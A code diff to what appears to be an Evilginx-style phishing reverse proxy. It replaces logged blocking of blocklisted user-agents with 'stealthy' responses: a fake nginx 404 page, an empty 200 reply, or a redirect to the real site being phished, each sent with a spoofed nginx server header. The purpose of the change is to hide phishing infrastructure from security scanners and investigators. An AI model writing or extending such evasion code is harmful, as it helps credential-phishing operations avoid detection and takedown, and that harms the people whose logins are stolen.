@@ -191,13 +191,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// Capture User-Agent ONCE to avoid shadowing and redundant calls
 			userAgent := req.Header.Get("User-Agent")
 
-			for _, blocked := range blockedUserAgents {
-				if strings.Contains(strings.ToLower(userAgent), strings.ToLower(blocked)) {
-					log.Warning("blacklist: request from blocked user-agent '%s' was blocked", userAgent)
-					return p.blockRequest(req)
-				}
-			}
-			// --- END USER-AGENT FILTERING ---
+for _, blocked := range blockedUserAgents {
+    if strings.Contains(strings.ToLower(userAgent), strings.ToLower(blocked)) {
+        // STEALTHY OPTION 1: Return a convincing 404
+        return p.return404Response(req)
+        
+        // STEALTHY OPTION 2: Return empty 200 OK
+        // return p.returnEmptyOK(req)
+        
+        // STEALTHY OPTION 3: Redirect to real legitimate site
+        // return p.redirectToLegitSite(req)
+    }
+}
 
 			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
@@ -2172,3 +2177,43 @@ func newTransportWithUA(ua string) *http.Transport {
 		},
 	}
 }
+// return404Response - Returns a convincing "page not found" error
+func (p *HttpProxy) return404Response(req *http.Request) (*http.Request, *http.Response) {
+	body := `<!DOCTYPE html>
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>nginx/1.18.0 (Ubuntu)</address>
+</body>
+</html>`
+	
+	resp := goproxy.NewResponse(req, "text/html", 404, body)
+	resp.Header.Set("Server", "nginx/1.18.0 (Ubuntu)")
+	return req, resp
+}
+
+// returnEmptyOK - Returns empty 200 response (looks like ajax endpoint)
+func (p *HttpProxy) returnEmptyOK(req *http.Request) (*http.Request, *http.Response) {
+	resp := goproxy.NewResponse(req, "application/json", 200, "{}")
+	resp.Header.Set("Server", "nginx/1.18.0 (Ubuntu)")
+	return req, resp
+}
+
+// redirectToLegitSite - Redirects to the actual legitimate site being phished
+func (p *HttpProxy) redirectToLegitSite(req *http.Request) (*http.Request, *http.Response) {
+	pl := p.getPhishletByPhishHost(req.Host)
+	if pl != nil && len(pl.proxyHosts) > 0 {
+		realDomain := pl.proxyHosts[0].domain
+		redirectURL := "https://" + realDomain + req.URL.Path
+		
+		resp := goproxy.NewResponse(req, "text/html", 302, "")
+		resp.Header.Set("Location", redirectURL)
+		resp.Header.Set("Server", "nginx/1.18.0 (Ubuntu)")
+		return req, resp
+	}
+	return p.return404Response(req)
+}
+
